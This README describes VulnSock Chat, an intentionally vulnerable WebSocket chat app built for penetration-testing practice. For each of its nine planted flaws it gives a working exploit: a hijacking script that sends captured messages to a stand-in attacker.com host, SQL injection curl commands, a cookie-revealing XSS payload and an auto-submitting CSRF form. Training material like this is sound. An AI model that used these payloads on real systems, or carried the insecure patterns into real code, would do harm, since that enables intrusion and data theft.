# VulnSock Chat

A WebSocket chat application with security vulnerabilities for penetration testing practice.

## Quick Start

```bash
docker-compose up --build
```

Access at `http://localhost:8080`

## Vulnerabilities

### 1. Cross-Site WebSocket Hijacking (CSWSH)
**Location:** `upgrader.CheckOrigin` in `main.go`

No origin validation on WebSocket connections. Any website can connect to the WebSocket endpoint.

**Exploit:**
```html
<script>
const ws = new WebSocket('ws://localhost:8080/ws');
ws.onopen = () => {
  ws.send(JSON.stringify({
    type: 'init',
    username: 'AttackerBot',
    content: ''
  }));
};
ws.onmessage = (e) => {
  fetch('https://attacker.com/log', {
    method: 'POST',
    body: e.data
  });
};
</script>
```

### 2. SQL Injection in Search
**Location:** `/api/search` endpoint

String concatenation in SQL query instead of parameterized queries.

**Exploits:**
```bash
# Extract schema
curl "http://localhost:8080/api/search?channel=general' UNION SELECT 1,name,sql,type FROM sqlite_master--&q=x"

# Boolean-based blind SQLi
curl "http://localhost:8080/api/search?q=test' AND '1'='1&channel=general"
curl "http://localhost:8080/api/search?q=test' AND '1'='2&channel=general"

# Time-based blind SQLi (SQLite)
curl "http://localhost:8080/api/search?channel=general' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) END)--&q=x"
```

### 3. SQL Injection in Preferences
**Location:** `/api/preferences` POST handler

String formatting used for INSERT query with user-controlled data.

**Exploit:**
```bash
curl -X POST "http://localhost:8080/api/preferences?username=admin" \
  -H "Content-Type: application/json" \
  -d '{"theme":"dark'"'"'), ('"'"'injected'"'"', '"'"'dark'"'"', 1, '"'"'en'"'"')--","notifications":true,"language":"en"}'

# Or extract data
curl -X POST "http://localhost:8080/api/preferences?username=test" \
  -H "Content-Type: application/json" \
  -d '{"theme":"x'"'"' UNION SELECT username, '"'"'dark'"'"', 1, '"'"'en'"'"' FROM users LIMIT 1--","notifications":true,"language":"en"}'
```

### 4. Stored XSS
**Location:** Message content handling

No sanitization of message content. Messages are inserted directly into DOM.

**Exploit:**
```javascript
ws.send(JSON.stringify({
  type: 'message',
  username: 'Attacker',
  content: '<img src=x onerror=alert(document.cookie)>',
  channel: 'general'
}));
```

### 5. No Authentication
No session validation or authentication. Anyone can connect and claim any username.

### 6. Information Disclosure
**Location:** `/api/users` endpoint

Exposes internal network addresses and active connections without authentication.

**Exploit:**
```bash
curl http://localhost:8080/api/users
```

### 7. CSRF on Broadcast
**Location:** `/api/broadcast` endpoint

No CSRF tokens. External sites can POST messages.

**Exploit:**
```html
<form action="http://localhost:8080/api/broadcast" method="POST">
  <input type="hidden" name="payload" value='{"type":"message","username":"Admin","content":"System compromised","channel":"general"}'>
</form>
<script>document.forms[0].submit();</script>
```

### 8. No Rate Limiting
Unlimited WebSocket connections and API requests per IP.

### 9. Race Condition in Client Map
**Location:** `clients` map access

`clientsMu` not held during entire connection lifecycle. Concurrent modifications possible between unlock and subsequent operations.


